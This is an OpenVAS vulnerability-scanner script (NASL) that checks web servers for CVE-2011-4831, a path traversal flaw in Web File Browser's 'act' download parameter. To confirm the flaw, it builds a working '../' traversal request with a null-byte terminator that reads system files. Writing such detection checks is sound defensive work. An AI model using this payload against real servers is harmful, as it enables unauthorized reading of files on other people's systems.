###############################################################################
# OpenVAS Vulnerability Test
#
# Web File Browser 'act' Parameter File Download Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802341");
  script_version("2020-08-24T15:18:35+0000");
  script_cve_id("CVE-2011-4831");
  script_bugtraq_id(50508);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-11-08 17:09:26 +0530 (Tue, 08 Nov 2011)");
  script_name("Web File Browser 'act' Parameter File Download Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71131");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18070/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50508/exploit");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to download and
  read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Web File Browser versions 0.4b14 and prior");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'act' parameter in
  'webFileBrowser.php', which allows attackers to download arbitrary files via a '../'(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running with Web File Browser and is prone to
  file download vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/webFileBrowser", "/webfilebrowser", "/", http_cgi_dirs(port:port))){

  if(dir == "/") dir = "";

  sndReq = http_get(item: dir + "/webFileBrowser.php", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if("<title>Web File Browser" >< rcvRes){

    foreach file (keys(files)){
      url = string(dir, "/webFileBrowser.php?act=download&subdir=&sortby=name&file=", crap(data:"../", length:6*9), files[file], "%00");

      if(http_vuln_check(port:port, url:url, pattern:file)){
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
